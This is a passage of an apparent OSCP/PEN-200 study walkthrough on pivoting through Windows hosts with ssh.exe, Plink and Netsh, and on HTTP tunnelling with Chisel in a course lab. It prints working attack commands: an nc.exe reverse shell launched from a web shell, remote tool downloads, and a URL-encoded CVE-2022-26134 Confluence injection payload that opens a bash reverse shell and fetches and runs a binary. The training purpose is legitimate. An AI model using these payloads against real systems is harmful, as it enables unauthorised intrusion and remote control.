---
title: '[OSCP, PEN-200] Instructional notes - Part 5'
disqus: hackmd
---

[OSCP, PEN-200] Instructional notes - Part 5
===

# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 1"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/README.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 2"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 3"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%203.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 4"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%204.md)

>[!Caution]
> 接續 [[OSCP, PEN-200] Instructional notes - Part 4](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%204.md) 內容

# Port Redirection and SSH Tunneling
## … SSH Tunneling ([Instructional notes - Part 4](https://hackmd.io/@CHW/rkjNgyi51x))
## Port Forwarding with Windows Tools
上述接說明 Linux-based 的 tunnel tools。 Windows 也有幾種 port forward 與 tunnel 的方法
### ssh.exe
Windows 內建 SSH: 自 2018 年 4 月 ([1803 版本](https://devblogs.microsoft.com/commandline/windows10v1803/#openssh-based-client-and-server)) 起內建 OpenSSH client，可以在 `%systemdrive%\Windows\System32\OpenSSH` 找到：
- ssh.exe
- scp.exe
- sftp.exe

這個 SSH client 可以用來連接任何支援 SSH 的伺服器（不限於 Windows SSH Server）

[環境範例]
- MULTISERVER03（Windows 機器） 只開放了 RDP 3389 port
- 可以 RDP 進入 MULTISERVER03，但無法直接綁定其他端口到外網。

解決方案：
- 在 MULTISERVER03 上使用 `ssh.exe`，建立一個 [Remote Dynamic Port Forwarding](https://hackmd.io/@CHW/rkjNgyi51x#SSH-Remote-Dynamic-Port-Forwarding)，讓流量通過 SSH Tunnel 回到 Kali 
- 這樣可以利用 SSH Kali 存取 PGDATABASE01（PostgreSQL 資料庫）

![image](https://hackmd.io/_uploads/SkLGpmNs1l.png)
#### 1. start the Kali SSH server
```
┌──(chw㉿CHW)-[~]
└─$ sudo systemctl start ssh
[sudo] password for chw:
```

可以用 `ss -ntplu` 查看啟用狀況

#### 2. 使用 [xfreerdp](https://www.freerdp.com/) 連接到 MULTISERVER03
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.131.64
[10:55:26:199] [372805:372806] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[10:55:26:199] [372805:372806] [WARN][com.freerdp.crypto] - CN = MULTISERVER03
...
```
![image](https://hackmd.io/_uploads/HyHJQoNoJe.png)

#### 3. 檢查 Windows SSH
打開 cmd.exe `where ssh` 確認是否有 SSH
```
C:\Users\rdp_admin>where ssh
C:\Windows\System32\OpenSSH\ssh.exe

C:\Users\rdp_admin>
```
檢查 SSH version
```
C:\Users\rdp_admin>ssh.exe -V
OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2
```
> OpenSSH version 高於 7.6，代表可以使用 remote dynamic port forwarding

#### 4. 創建 remote dynamic port forward 到 Kali
Windows 創建 remote dynamic port forward 到 Kali port 9998
```
C:\Users\rdp_admin>ssh -N -R 9998 chw@192.168.45.213
The authenticity of host '192.168.45.213 (192.168.45.213)' can't be established.
ECDSA key fingerprint is SHA256:Atuf88ckgvdjD92PblnxCBvzAiN1jtxNUv6woYcEmxg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.45.213' (ECDSA) to the list of known hosts.
chw@192.168.45.213's password:
|
```

確認連線狀況
```
┌──(chw㉿CHW)-[~]
└─$ ss -ntplu
Netid       State         Recv-Q        Send-Q               Local Address:Port                Peer Address:Port       Process       
...
tcp         LISTEN        0             128                      127.0.0.1:9998                     0.0.0.0:*                        
tcp         LISTEN        0             128                        0.0.0.0:22                       0.0.0.0:*                        
tcp         LISTEN        0             128                          [::1]:9998                        [::]:*                        
tcp         LISTEN        0             128                           [::]:22                          [::]:*
```
#### 5. 配置 Proxychains
Kali 設定 SOCKS proxy
```
┌──(chw㉿CHW)-[~]
└─$ tail /etc/proxychains4.conf   
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
#socks5 192.168.147.63 9999
socks5 127.0.0.1 9998
```
#### 6. 使用 Proxychains 透過 SSH 隧道連接 PostgreSQL
```
┌──(chw㉿CHW)-[~]
└─$ proxychains psql -h 10.4.131.215 -U postgres  

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.131.215:5432  ...  OK
Password for user postgres: 
[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.131.215:5432  ...  OK
psql (16.3 (Debian 16.3-1+b1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
Type "help" for help.

postgres=# \l
                                                        List of databases
    Name    |  Owner   | Encoding | Locale Provider |   Collate   |    Ctype    | ICU Locale | ICU Rules |   Access privileges   
------------+----------+----------+-----------------+-------------+-------------+------------+-----------+-----------------------
 confluence | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
 postgres   | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
 template0  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
            |          |          |                 |             |             |            |           | postgres=CTc/postgres
 template1  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
            |          |          |                 |             |             |            |           | postgres=CTc/postgres
(4 rows)
```
> 成功登入 PostgreSQL database

>[!Warning]
> Question: Log in to MULTISERVER03 with the rdp_admin credentials we found in the Confluence database (rdp_admin:P@ssw0rd!). Enumerate which port forwarding techniques are available, then use the Windows OpenSSH client to create a port forward that allows you to reach port 4141 on PGDATABASE01 from your Kali machine.\
> [file: [ssh_exe_exercise_client](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/extras/prat2/d5a2ba960124f3cf5089951b99445af5-ssh_exe_exercise_client_aarch64)]
> 解法：
> 1. 將 4141 port Tunnel 到 Kali 4141 port: `ssh -N -R 4141:10.4.131.215:4141 chw@192.168.45.213` 
> 2. `ss -ntplu` 確認連線狀況
> 3. Kali 上 `wget {file}`
> 4. `chmod +x {file}`
> 5. `./{file} -h 127.0.0.1 -p 4141`
> ![image](https://hackmd.io/_uploads/SJLY6jViJg.png)
> 6. `./{file} -i 127.0.0.1 -p 4141`: GET FLAG

### Plink
Administrators 會避免 OpenSSH 留在 Windows machine 上，因此我們不能保證能發現 OpenSSH Client\
在 OpenSSH 之前大多使用 [PuTTY](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) 與 cmd line 工具 [Plink](https://tartarus.org/~simon/putty-snapshots/htmldoc/Chapter7.html)
>[!Tip]
Plink (PuTTY Link) 是 PuTTY 的 cmd 版本，專為 Windows 環境設計的 SSH 客戶端。\
功能類似 OpenSSH client，但 不支援 Remote Dynamic Port Forwarding。\
由於 Windows 環境常見，也較少被防毒軟體偵測為惡意程式，因此在滲透測試中很有用。

[環境範例]
- 在內網發現了一台 Windows 伺服器 MULTISERVER03，它只開放了 TCP 80 ，其他端口都被防火牆擋住。 
- 無法直接使用 RDP 或 OpenSSH client 連回 Kali 機器，但可以透過 HTTP Web Shell 來執行命令。 
- 目標透過 Plink 建立 Remote Port Forwarding，讓我們可以透過 Kali 連到內部服務 (如 PostgreSQL 伺服器)
- 首先需要透過 Web Shell 取得一個更穩定的 Reverse Shell。
- 執行 Plink 建立 Port Forwarding
- 在 Kali 透過 Plink 轉發的 Port 連接到 Windows RDP

![image](https://hackmd.io/_uploads/SJ6Sgh4syl.png)

#### 1. Web Shell
在 MULTISERVER03 的 Web Applicaiton 注入 Web Shell，
<img width="954" alt="image" src="https://github.com/user-attachments/assets/b4d3a9d7-768e-490f-8bbd-489424a461f5" />

LAB 環境已經幫我們注入 Web Shell\
http://192.168.226.64/umbraco/forms.aspx

![image](https://hackmd.io/_uploads/HJtdDKHi1g.png)
> user: `iis apppool\defaultapppool`

但現在環境 RDP 與 OpenSSH 皆被防火牆阻擋。導致沒辦法建立 remote port forward。

#### 2. 建立 Reverse shell
使用 Web shell 將 `nc.exe` 下載 到 MULTISERVER03，然後再使用 Reverse shell 傳送回 Kali 
##### 2.1 Kali 啟用 Apache2
在 Kali 中啟用 Apache2 Service，並放入 `nc.exe`
```
┌──(chw㉿CHW)-[~]
└─$ sudo systemctl start apache2
[sudo] password for chw: 

┌──(chw㉿CHW)-[~]
└─$ find / -name nc.exe 2>/dev/null
/usr/share/windows-resources/binaries/nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe

┌──(chw㉿CHW)-[~]
└─$ sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
```
##### 2.2 透過 Web shell 將 nc.exe 下載 到 MULTISERVER03
```
powershell wget -Uri http://192.168.45.220/nc.exe -OutFile C:\Windows\Temp\nc.exe
```
> `wget -Uri`: 透過 HTTP 下載\
`-OutFile C:\Windows\Temp\nc.exe` : 儲存到 `C:\Windows\Temp`

##### 2.3 建立 Reverse shell
Kali 監聽：
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888          
listening on [any] 8888 ...

```
Weshell 執行 nc.exe
```
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.220 8888
```
![image](https://hackmd.io/_uploads/Hy-p5Fri1x.png)

Kali 成功接收 Reverse shell
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888          
listening on [any] 8888 ...
connect to [192.168.45.220] from (UNKNOWN) [192.168.226.64] 59644
Microsoft Windows [Version 10.0.20348.1487]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>

```
#### 3. 利用 Plink 建立 remote port forward
##### 3.1 與 `nc.exe` 相同步驟，載入 `plink.exe`
將 plink.exe 丟上 Kali Apache Service
```
┌──(chw㉿CHW)-[~]
└─$ find / -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe
                                                           
┌──(chw㉿CHW)-[~]
└─$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/

┌──(chw㉿CHW)-[~]
└─$ ls /var/www/html/
index.html  index.nginx-debian.html  nc.exe  plink.exe
```
因為我們已取得 MULTISERVER03 Reverse shell，可以直接在 Kali 操作，不用透過 Web Shell
```
c:\windows\system32\inetsrv>powershell wget -Uri http://192.168.45.220/plink.exe -OutFile C:\Windows\Temp\plink.exe
powershell wget -Uri http://192.168.45.220/plink.exe -OutFile C:\Windows\Temp\plink.exe
```

##### 3.2 使用 Plink 建立 remote port forwarding
設定 Plink remote port forwarding：
從 MULTISERVER03 RDP port 到 Kali 9833 port
>[!Tip]
> Plink 語法與 OpneSSH 非常相似\
> OpenSSH: `ssh -N -R 127.0.0.1:9833:10.4.195.215:3389 chw@192.168.45.220`

>[!Caution]
>This might log our `Kali password` somewhere undesirable! If we're in a hostile network, we may wish to **create a port-forwarding only user** on our Kali machine for remote port forwarding situations.
```
c:\windows\system32\inetsrv>C:\Windows\Temp\plink.exe -ssh -l chw -pw {Your pwd} -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.220
C:\Windows\Temp\plink.exe -ssh -l chw -pw {Your pwd} -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.220
The host key is not cached for this server:
  192.168.45.220 (port 22)
You have no guarantee that the server is the computer you
think it is.
The server's ssh-ed25519 key fingerprint is:
  ssh-ed25519 255 SHA256:eyUOKg67H7A1p1DUMuysCB4PMQ7Ht5/QPJehWoA32z4
If you trust this host, enter "y" to add the key to Plink's
cache and carry on connecting.
If you want to carry on connecting just once, without adding
the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n, Return cancels connection, i for more info) y
Using username "chw".
Linux CHW 6.8.11-arm64 #1 SMP Kali 6.8.11-1kali2 (2024-05-30) aarch64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Mar  5 03:38:52 2025 from 192.168.226.64
┌──(chw㉿CHW)-[~]
└─$
```
> `-ssh`: 使用 SSH 連線到 Kali\
`-l chw`: 使用者名稱 chw\
`-pw {Your pwd}`: SSH 登入密碼\
`-R 127.0.0.1:9833:127.0.0.1:3389`: Remote Port Forwarding 在 Kali 的 127.0.0.1:9833 上開啟端口轉發到 MULTISERVER03 本機的 127.0.0.1:3389 (RDP)\
`192.168.45.220`: Kali 的 IP

驗證連線狀態：
```
┌──(chw㉿CHW)-[~]
└─$ ss -ntplu
Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port Process 
...
tcp    LISTEN  0       128          127.0.0.1:9833         0.0.0.0:*            
tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*            
tcp    LISTEN  0       128               [::]:22              [::]:*            
tcp    LISTEN  0       511                  *:80                 *:*
```
> 成功建立 port forwarding 9833 port
> > 也能觀察到上述建立的 Apache 80 port

![image](https://hackmd.io/_uploads/r1nVxcroJl.png)
> Kali 在  loopback interface 開啟了 9833 port

#### 4. 登入 RDP
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
[03:58:52:657] [543810:543811] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[03:58:52:657] [543810:543811] [WARN][com.freerdp.crypto] - CN = MULTISERVER03
```
![image](https://hackmd.io/_uploads/H1jqG5Bi1g.png)

### Netsh
Netsh 是 Windows 內建的網路管理工具 (也稱為Network Shell)，可用來設定防火牆、IP 配置、port forward 等功能。netsh interface [portproxy](https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy) 可用來 建立端口轉發規則，將一個 IP/Port 的流量轉發到另一個 IP/Port。
對於內網滲透很有用，當無法直接存取目標伺服器時，可透過 Netsh 建立跳板機 (Pivoting)。
- [Netsh command syntax, contexts, and formatting](https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts#subcontexts)

[環境範例]
- MULTISERVER03 的防火牆阻擋了大部分的入站連線。
- MULTISERVER03 允許 TCP 3389 (RDP) 連線，所以我們可以 使用 RDP 來登入 Windows。
- MULTISERVER03 沒有 OpenSSH，所以我們無法透過 `ssh.exe` 或 `Plink` 進行 Port Forwarding。

解決方案：
- 使用 Netsh 建立 Port Forwarding，讓外部設備可以透過 MULTISERVER03 連線到 PGDATABASE01

![image](https://hackmd.io/_uploads/S1rgyjriyx.png)

#### 1. 登入 MULTISERVER03 RDP
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.226.64
[05:15:03:063] [580395:580396] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[05:15:03:063] [580395:580396] [WARN][com.freerdp.crypto] - CN = MULTISERVER03
```

#### 2. 設定 Netsh Port Forwarding
在 RDP 中使用 Administrator 開啟 `cmd.exe`\
```
C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.226.64 connectport=22 connectaddress=10.4.226.215
```
> `listenport=2222`: 設定監聽流量 port 2222\
`listenaddress=192.168.50.64`: 設定監聽 IP\
`connectport=22`: 流量將被轉發到 Target Machine SSH Service port 22
`connectaddress=10.4.50.215`: Target Machine 的內網 IP

以上表示當我們連線到 MULTISERVER03 的 2222 端口時，流量會被轉發到 PGDATABASE01 的 22 端口

使用 `netstat` 檢查 Port 是否在監聽
```
C:\Windows\system32>netstat -anp TCP | find "2222"
  TCP    192.168.226.64:2222    0.0.0.0:0              LISTENING
```
也可以使用 `netsh interface portproxy` 檢查配置
```
C:\Windows\system32>netsh interface portproxy show all

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
192.168.226.64  2222        10.4.226.215    22
```
> 代表 MULTISERVER03 會將 2222 port 的流量轉發到 PGDATABASE01 的 SSH (22 port)

![image](https://hackmd.io/_uploads/S1CvhoHoke.png)

串聯好 MULTISERVER03 到 PGDATABASE01 的 port forwarding，但 Kali 只能透過 RDP，仍然無法連線到 2222 port

使用 nmap 驗證：
```
┌──(chw㉿CHW)-[~]
└─$ sudo nmap -sS 192.168.226.64 -Pn -n -p2222
[sudo] password for chw: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-05 05:52 EST
Nmap scan report for 192.168.226.64
Host is up.

PORT     STATE    SERVICE
2222/tcp filtered EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
```
![image](https://hackmd.io/_uploads/S1YVasHs1x.png)
> 我們有 RDP，可以嘗試調整 Firewall

#### 3. 調整 Windows 防火牆
```
C:\Windows\system32>netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.226.64 localport=2222 action=allow
Ok.
```
> `netsh advfirewall firewall add rule`: 在 Windows 防火牆中新增規則\
`name="port_forward_ssh_2222"`: 設定規則名稱\
`protocol=TCP`: 只允許 TCP 連線\
`dir=in`: 規則適用於 Inbound 連線\
`localip=192.168.226.64`: 只允許連線到本機 IP\
`localport=2222`: 允許 2222 port\
`action=allow`: 允許規則通過

再一次使用 nmap 驗證：
```
┌──(chw㉿CHW)-[~]
└─$ sudo nmap -sS 192.168.226.64 -Pn -n -p2222
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-05 06:02 EST
Nmap scan report for 192.168.226.64
Host is up (0.13s latency).

PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
```
> STATE: open

#### 4. SSH 連線 Port Forwarding 
```
┌──(chw㉿CHW)-[~]
└─$ ssh database_admin@192.168.226.64 -p2222
The authenticity of host '[192.168.226.64]:2222 ([192.168.226.64]:2222)' can't be established.
ED25519 key fingerprint is SHA256:oPdvAJ7Txfp9xOUIqtVL/5lFO+4RY5XiHvVrZuisbfg.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:14: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
Last login: Thu Feb 16 21:49:42 2023 from 10.4.50.63
database_admin@pgdatabase01:~$ 
```
![image](https://hackmd.io/_uploads/BJFeghHiyg.png)

#### 5. 復原環境
- 刪除防火牆規則
```
C:\Windows\system32>netsh advfirewall firewall delete rule name="port_forward_ssh_2222"

Deleted 1 rule(s).
Ok.
```
- 刪除 Port Forwarding
```
C:\Windows\system32>netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.226.64
```
# Tunneling Through Deep Packet Inspection
>[!Note]
>**深度封包檢測 Deep Packet Inspection (DPI)**\
DPI 是一種監控網路流量的技術，它可以根據一組規則檢查並阻擋特定類型的封包。

- DPI 監控與網路邊界防禦
    - 深度封包檢測 (DPI) 是一種網路監控技術，用來分析封包的內容，而不只是查看封包的標頭 (如 IP、TCP/UDP 端口)。
    - DPI 常用於網路邊界，可以過濾流量並偵測潛在的惡意活動或違規行為 (例如未經授權的 SSH 連線)。
- DPI 限制特定協議
DPI 可以設定只允許某些協議通過網路，例如：\
✅ 允許 HTTP、HTTPS，但封鎖 SSH\
✅ 只允許 DNS 查詢，但封鎖 VPN\
這樣的會導致所有使用 SSH 傳輸的流量 (包括 SSH 端口轉發和隧道) 都無法使用。
- 利用隧道技術繞過 DPI: `HTTP Tunneling` or `DNS Tunneling`

## HTTP Tunneling Theory and Practice
包含 HTTP tunneling 及 chisel 使用方法
### HTTP Tunneling Fundamentals

情境範例，攻擊者成功入侵了 CONFLUENCE01，但發現： 
- 所有 Outbound 流量 除了 HTTP (TCP/80, TCP/443) 以外都被封鎖
- 所有 Inbound 端口 只開放 TCP/8090，無法透過 Reverse Shell 直接連回攻擊者的 Kali 機器
- SSH Port Forwarding 也無法使用，因為 SSH 連線會被 DPI 阻擋

![image](https://hackmd.io/_uploads/rkG8NhBiyx.png)
> FIREWALL/INSPECTOR 代替簡易的 Firewall\
> 雖然我們有 PGDATABASE01 credentials， 但仍然需要 tunnel 進到內網，但環境只允許 HTTP connection OutBound

代表傳統的 Reverse Shell 或 SSH Tunneling 都行不通，唯一能用的協議是 HTTP。

>[!Note]
>**HTTP 通道 (HTTP Tunneling)** 的運作方式:\
HTTP Tunneling 是將其他類型的網路流量（如 SSH 或 TCP ）包裝成 HTTP request，讓流量看起來像正常的網頁流量，從而繞過防火牆的封鎖。\

在以上情境範例中，解決方案： 
- 在 CONFLUENCE01 上架設 HTTP Proxy
- 讓所有 OutBound 的 SSH、TCP 連線都封裝成 HTTP 請求，透過 proxy發送
- Kali 解封裝這些請求，再轉發到內部的 PGDATABASE01 伺服器

這樣一來，DPI 只會看到 看起來像一般 HTTP 流量的隧道連線，無法阻擋我們的存取。

### HTTP Tunneling with Chisel
[Chisel](https://github.com/jpillora/chisel) 是一個 HTTP tunneling tool，它將我們的 data stream 封裝在 HTTP 中。它還在隧道內使用 SSH protocol，因此我們的資料會被加密。\
Chisel 使用 client/server model。需要設定一個 Chisel server，接受來自 Chisel client 的連線。\
根據 Server & Client configurations，有各種 port forwarding 可用。對於此環境來說特別有用的是 reverse port forwarding，類似於 SSH remote port forwarding。

#### 1. 在 Kali 啟動 Apache 提供 Chisel client binary
在 Kali 上執行一個 Chisel Server，接收來自在 CONFLUENCE01 上執行的 Chisel Client 連線。\
Chisel 將在 Kali 綁定一個 SOCKS proxy port。 Chisel Server 將封裝(encapsulate) 並透過 SOCKS port 發送內容，接著透過 HTTP tunnel（SSH 加密）推送。\
在 Chisel Client 會對其進行解封裝(decapsulate)，並推送到對應 address\
![image](https://hackmd.io/_uploads/BkPc02BjJx.png)
>  Kali 上的 Chisel Server 監聽 TCP 1080 (SOCKS proxy port)

我們將在 Chisel Server 上使用 `--reverse` flag ([Chisel guide](https://github.com/jpillora/chisel#usage)) 讓 client 端連線。因此需要在 CONFLUENCE01(Chisel client) 安裝 Chisel client binary
```
┌──(chw㉿CHW)-[~]
└─$ sudo cp $(which chisel) /var/www/html/

┌──(chw㉿CHW)-[~]
└─$ ls /var/www/html
chisel  index.html  index.nginx-debian.html  nc.exe  plink.exe

┌──(chw㉿CHW)-[~]
└─$ sudo systemctl start apache2
```
#### 2. Confluence Injection & 載入 Chisel client
使用與 [SSH Port Forwarding LAB](https://hackmd.io/@CHW/rkjNgyi51x#Port-Forwarding-with-Linux-Tools) 中相同的弱點 CVE-2022-26134 (Confluence Injection Payload)，注入 Reverse Shell
```
┌──(chw㉿CHW)-[~]
└─$ curl http://192.168.226.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.220/5678%200%3E%261%27%29.start%28%29%22%29%7D/

```
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 5678
listening on [any] 5678 ...
connect to [192.168.45.220] from (UNKNOWN) [192.168.226.63] 57320
bash: cannot set terminal process group (3082): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
$ 
```
在 CONFLUENCE01 載入 Chisel client binary
```
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
$ wget 192.168.45.220/chisel -O /tmp/chisel && chmod +x /tmp/chisel
...  

2025-03-05 12:34:37 (719 KB/s) - ‘/tmp/chisel’ saved [8986384/8986384]

```
以上 Confluence Injection + 載入 Chisel client binary
可以合併在 Confluence Injection payload 執行 bash:
```
curl http://192.168.223.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.213/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```
>`curl http://192.168.223.63:8090/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','wget 192.168.45.213/chisel -O /tmp/chisel && chmod +x /tmp/chisel').start()")}/`

透過 apache2/access.log 確認是否成功存取 
```
┌──(chw㉿CHW)-[~]
└─$ tail -f /var/log/apache2/access.log
...
192.168.223.63 - - [05/Mar/2025:10:54:43 -0500] "GET /chisel HTTP/1.1" 200 8986651 "-" "Wget/1.20.3 (linux-gnu)"
```


#### 3. 在 Kali 設置 Chisel Server
```
┌──(chw㉿CHW)-[~]
└─$ chisel server --port 8080 --reverse
2025/03/05 10:59:09 server: Reverse tunnelling enabled
2025/03/05 10:59:09 server: Fingerprint Hak4ZQEpdrSrh6XREINVXnX2epeiu/fPTOJDFF89oSI=
2025/03/05 10:59:09 server: Listening on http://0.0.0.0:8080
```
>`--port 8080`: 設定 HTTP 伺服器的端口\
`--reverse` → 允許 反向 SOCKS Tunnel
>> Chisel Server 啟動監聽 8080 port，並已啟用 reverse tunneling

利用 Tcpdump 確認是否成功監聽
```
┌──(chw㉿CHW)-[~]
└─$ sudo tcpdump -nvvvXi tun0 tcp port 8080
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```
>`-n`: 不解析 DNS (只顯示 IP 地址)\
`-vvv`:	最詳細資訊 (Extremely verbose mode)\
`-X`: 顯示封包內容 (HEX & ASCII 格式)\
`-i tun0`: 指定監聽 tun0 interface\
`tcp port 8080`: 只攔截 TCP 8080 端口的流量

#### 4. 在 Target Machine 啟動 Chisel Client
在 CONFLUENCE01 執行：\
`/tmp/chisel client 192.168.45.213:8080 R:socks`
> `R:socks`; 建立 SOCKS 代理 (Port 1080)

透過 Confluence Injection payload 注入
```
┌──(chw㉿CHW)-[~]
└─$ curl http://192.168.223.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.213:8080%20R:socks%27%29.start%28%29%22%29%7D/

```
但 Tcpdump 沒有任何輸出，Chisel Server 也沒有顯示任何 activity\
👉🏻 輸出 error output，指定 stdout 和 stderr\
`/tmp/chisel client 192.168.45.213:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.45.213:8080/`\
一樣透過 Confluence Injection payload 執行：
```
┌──(chw㉿CHW)-[~]
└─$ curl http://192.168.223.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.45.213:8080/%27%29.start%28%29%22%29%7D/
```
查看 Tcpdump 輸出
```
...
11:51:10.541434 IP (tos 0x0, ttl 61, id 3355, offset 0, flags [DF], proto TCP (6), length 269)
    192.168.223.63.44416 > 192.168.45.213.8080: Flags [P.], cksum 0xc239 (correct), seq 1:218, ack 1, win 502, options [nop,nop,TS val 1858903610 ecr 3982602], length 217: HTTP, length: 217
        POST / HTTP/1.1
        Host: 192.168.45.213:8080
        User-Agent: curl/7.68.0
        Accept: */*
        Content-Length: 64
        Content-Type: application/x-www-form-urlencoded
        
        bash: /tmp/chisel: cannot execute binary file: Exec format error [|http]
...
```
> 工作環境是 MAC: ARM (aarch64)，改丟 x86_64 (amd64)

(更改版本後)\
Kali Chisel Server 顯示連線成功
```
┌──(chw㉿CHW)-[~]
└─$ chisel server --port 8080 --reverse
2025/03/05 12:19:59 server: Reverse tunnelling enabled
2025/03/05 12:19:59 server: Fingerprint /3ssFfIIRcOmcR0G+9LAcztNy2WKFxWk8VEkST81lss=
2025/03/05 12:19:59 server: Listening on http://0.0.0.0:8080
2025/03/05 12:20:57 server: session#1: Client version (1.8.1) differs from server version (1.10.1-0kali1)
2025/03/05 12:20:57 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

```

